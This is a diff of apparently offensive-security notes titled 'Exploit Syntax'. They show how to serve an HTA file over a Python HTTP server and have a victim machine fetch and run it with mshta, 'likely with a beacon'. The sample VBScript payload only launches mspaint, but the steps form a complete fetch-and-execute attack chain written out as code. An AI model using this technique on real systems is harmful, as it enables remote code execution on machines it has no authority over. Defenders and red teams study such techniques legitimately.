@@ -2,8 +2,13 @@
 
 ## Exploit Syntax:
 
-
-1. Create an hta file with the following contents and save it in your malware directory: 
+1. Run: 
+```sh
+mkdir /tmp/MrMeeseeks
+cd /tmp/MrMeeseeks
+```
+2. Create an hta file with the following contents and save it as 'lookAtMe': 
+ > *NOTE*: The .hta file extension is not required.
 
 ```VBScript
 <!DOCTYPE html>
@@ -18,17 +23,17 @@
   <script language = "VBScript">
     Dim com
     Set com = CreateObject("WScript.Shell")
-    com.run "cmd.exe /C mspaint.exe"
+    com.run "mspaint.exe"
     set com = Nothing
   </script>
 </head>
 ```
 
-2. Start a simple http server with Python
+3. Change directory to the payload folder and start a simple http server with Python
 ```Bash
 python3 -m http.server 6789
 ```
-3. On the victim machine, likely with a beacon run the following:
+4. On the victim machine, likely with a beacon run the following:
 ```powershell
 sharpps mshta http://<webserverIP>:6789/<nameofHTAfile>
 ```
